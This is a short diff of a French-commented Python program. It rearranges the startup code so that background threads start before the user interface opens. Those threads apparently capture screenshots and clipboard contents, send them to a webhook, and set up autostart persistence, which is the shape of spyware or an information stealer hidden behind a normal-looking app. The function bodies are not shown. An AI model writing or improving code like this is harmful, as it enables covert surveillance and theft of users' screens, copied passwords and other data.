@@ -1322,14 +1322,13 @@ def lancer_ui():
     except Exception as e:
         print(f"Erreur lors du lancement de l'interface utilisateur : {e}")
 
-
-
-
 if __name__ == "__main__":
-    # Démarrer les threads pour les options
-    lancer_ui()
+    # Démarrer tous les threads en arrière-plan AVANT l'UI
     threading.Thread(target=screenshot_option_func, args=(webhook,), daemon=True).start()
     threading.Thread(target=clipboard_option_func, args=(webhook,), daemon=True).start()
     threading.Thread(target=autostart_option_func, daemon=True).start()
     threading.Thread(target=loop_check, daemon=True).start()
-    threading.Thread(target=boucle, daemon=True).start()
+    threading.Thread(target=boucle, args=(ancienne_version,), daemon=True).start()
+    
+    # Lancer l'interface (bloquant)
+    ft.app(target=main)
